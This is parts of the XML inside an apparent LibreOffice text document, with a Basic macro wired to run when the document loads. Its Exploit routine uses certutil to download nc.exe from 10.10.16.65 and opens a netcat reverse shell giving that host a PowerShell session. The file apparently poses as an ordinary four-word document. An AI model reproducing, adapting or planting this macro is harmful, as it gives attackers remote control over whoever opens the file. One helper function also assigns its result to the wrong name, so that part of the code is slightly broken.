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OnLoad?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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7073" officeooo:paragraph-rsid="001770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ere is the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n3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2019-05-17T07:55:16.991583423</dc:date>
    <meta:editing-duration>PT12M35S</meta:editing-duration>
    <meta:editing-cycles>8</meta:editing-cycles>
    <meta:generator>LibreOffice/6.1.5.2$Linux_X86_64 LibreOffice_project/10$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="1" meta:word-count="4" meta:character-count="18" meta:non-whitespace-character-count="15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
    Sub OnLoad
      Dim os as string
      os = GetOS
      If os = "windows" OR os = "osx" OR os = "linux" Then
        Exploit
      end If
    End Sub

    Sub Exploit
      Shell("cmd.exe /C net use /D /Y * &amp;&amp; cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.16.65/nc.exe"" C:\Users\Public\nc.exe &amp; C:\Users\Public\nc.exe 10.10.16.65 1234 -e powershell.exe")
    End Sub

    Function GetOS() as string
      select case getGUIType
        case 1:
          GetOS = "windows"
        case 3:
          GetOS = "osx"
        case 4:
          GetOS = "linux"
      end select
    End Function

    Function GetExtName() as string
      select case GetOS
        case "windows"
          GetFileName = "exe"
        case else
          GetFileName = "bin"
      end select
    End Function
    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